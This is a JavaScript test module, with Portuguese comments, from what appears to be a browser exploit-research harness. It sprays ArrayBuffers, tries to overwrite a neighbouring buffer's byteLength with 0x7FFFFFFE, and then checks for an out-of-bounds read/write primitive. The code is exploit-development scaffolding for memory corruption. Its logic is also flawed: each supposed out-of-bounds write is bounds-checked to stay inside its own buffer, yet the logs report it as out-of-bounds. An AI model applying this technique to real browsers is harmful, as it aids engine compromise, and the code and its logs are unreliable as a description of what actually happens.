// js/script2/testOOBWriteMetadata.mjs
import { logS2, PAUSE_S2, toHexS2 } from './s2_utils.mjs';

export async function testOOBWriteMetadataS2() {
    const FNAME = 'testOOBWriteMetadataS2';
    logS2("--- Teste: OOB Write -> Metadata (ArrayBuffer.byteLength S2) ---",'test', FNAME);
    const controlBufferSize = 64;
    const targetBufferSize = 64;
    const sprayCount = 50;
    const targetCorruptedLengthValue = 0x7FFFFFFE;
    const targetBuffers = [];
    let controlBuffer = null;
    let dvControl = null;
    let writeSuccessCount = 0; // Contador para escritas OOB bem-sucedidas
    let corruptionSuccess = false;
    const allocationSizeControl = controlBufferSize + 256;
    const baseOffsetInControlDV = 128;
    let foundCorruptingOffset = -1;
    // Inicializa finalResultLog corretamente
    let finalResultLog = `AVISO: Nenhuma escrita OOB realizada ou nenhuma corrupção detectada.`;


    try {
        controlBuffer = new ArrayBuffer(allocationSizeControl);
        dvControl = new DataView(controlBuffer);
        for(let i=0; i<controlBuffer.byteLength; i++) dvControl.setUint8(i, 0xDD);
    } catch(e){
        logS2(`Erro fatal ao alocar buffer de controle S2: ${e.message}`, 'error', FNAME);
        return;
    }

    logS2(`Alocando ${sprayCount} buffers alvo de ${targetBufferSize} bytes...`, 'info', FNAME);
    for(let i=0; i<sprayCount; i++){
        try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }
        catch(e){ logS2(`Falha ao alocar buffer alvo ${i}: ${e.message}`, 'warn', FNAME); }
    }
    await PAUSE_S2();

    const metadataOffsetsToTry = [-8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32];

    for(const tryOffset of metadataOffsetsToTry){
        const targetWriteAddr = baseOffsetInControlDV + controlBufferSize + tryOffset;
        const relOffsetStr = `ctrlEnd+${tryOffset} (addr lógico ${targetWriteAddr} em dvControl)`;
        logS2(`Tentando offset OOB metadata S2: ${tryOffset}... Addr: ${targetWriteAddr}`, 'info', FNAME);
        let currentWriteOK = false;

        try {
            if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
                dvControl.setUint32(targetWriteAddr, targetCorruptedLengthValue, true);
                writeSuccessCount++; // Incrementa o contador aqui
                currentWriteOK = true;
                logS2(` -> Escrita OOB U32 em ${relOffsetStr} parece OK.`, 'info', FNAME);
            } else {
                logS2(` -> Offset OOB ${relOffsetStr} fora dos limites do buffer de controle.`, 'warn', FNAME);
            }
        } catch(e){
            logS2(` -> Escrita OOB U32 falhou/bloqueada em ${relOffsetStr}: ${e.message}`, 'good', FNAME);
        }

        if(currentWriteOK){
            logS2(` -> Verificando ${targetBuffers.length} buffers alvo...`, 'info', FNAME);
            await PAUSE_S2(5);
            for(let j=0; j<targetBuffers.length; j++){
                try {
                    const currentLength = targetBuffers[j]?.byteLength;
                    if(currentLength === targetCorruptedLengthValue){
                        logS2(`---> VULN: ArrayBuffer alvo ${j} teve byteLength CORROMPIDO para ${toHexS2(targetCorruptedLengthValue)} com escrita OOB em ${relOffsetStr}!`, 'critical', FNAME);
                        corruptionSuccess = true;
                        foundCorruptingOffset = tryOffset;
                        // finalResultLog atualizado aqui dentro se sucesso
                        // (será definido fora do loop para o log final)

                        try {
                            const corruptedTargetBuffer = targetBuffers[j];
                            const corruptedDv = new DataView(corruptedTargetBuffer);
                            const originalTargetSize = targetBufferSize;
                            const readWriteDemoOffset = originalTargetSize + 4;
                            if (readWriteDemoOffset < corruptedTargetBuffer.byteLength - 4) {
                                const testPattern = 0x12345678;
                                logS2(` -> Tentando R/W (${toHexS2(testPattern)}) via buffer corrompido ${j} @ offset ${readWriteDemoOffset}...`, 'info', FNAME);
                                corruptedDv.setUint32(readWriteDemoOffset, testPattern, true);
                                const readBack = corruptedDv.getUint32(readWriteDemoOffset, true);
                                if (readBack === testPattern) {
                                    logS2(` ---> SUCESSO DEMO: R/W além dos limites originais do ArrayBuffer ${j} CONFIRMADA! (Leu ${toHexS2(readBack)})`, 'vuln', FNAME);
                                    logS2(` ---> *** ALERTA: Primitiva de R/W Arbitrária (limitada ao novo tamanho ${toHexS2(corruptedTargetBuffer.byteLength)}) obtida! ***`, 'escalation', FNAME);
                                } else {
                                    logS2(` -> AVISO DEMO: Escrita no buffer ${j} corrompido @ ${readWriteDemoOffset} falhou na verificação (leu ${toHexS2(readBack)}).`, 'warn', FNAME);
                                }
                            } else {
                                logS2(` -> INFO DEMO: Offset de teste ${readWriteDemoOffset} fora do novo tamanho ${corruptedTargetBuffer.byteLength}.`, 'info', FNAME);
                            }
                        } catch (eDemo) {
                            logS2(` -> ERRO DEMO: Erro R/W estendido no buffer ${j} corrompido: ${eDemo.message}`, 'error', FNAME);
                        }
                        break; 
                    }
                } catch(eCheck) {
                    logS2(`Erro ao verificar buffer alvo ${j}: ${eCheck.message}`, 'error', FNAME);
                }
            }
            try{
                if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
                    dvControl.setUint32(targetWriteAddr, 0xDDDDDDDD, true);
                }
            } catch(eRestore){}
        }
        if(corruptionSuccess) break;
        await PAUSE_S2(10);
    }

    // Define a mensagem final do log baseada nos resultados
    if (corruptionSuccess) {
        finalResultLog = `SUCESSO! byteLength corrompido usando offset relativo ctrlEnd+${foundCorruptingOffset}. Total de escritas OOB bem-sucedidas: ${writeSuccessCount}.`;
        logS2(finalResultLog, 'vuln', FNAME);
    } else if (writeSuccessCount > 0) {
        finalResultLog = `AVISO: Escrita(s) OOB realizada(s) (${writeSuccessCount}x), mas nenhuma corrupção de byteLength detectada.`;
        logS2(finalResultLog, 'warn', FNAME);
    } else {
        finalResultLog = `Escrita OOB falhou/bloqueada. Nenhuma corrupção possível.`;
        logS2(finalResultLog, 'good', FNAME);
    }
    
    logS2("--- Teste OOB Write -> Metadata S2 Concluído ---",'test', FNAME);
    await PAUSE_S2();
}
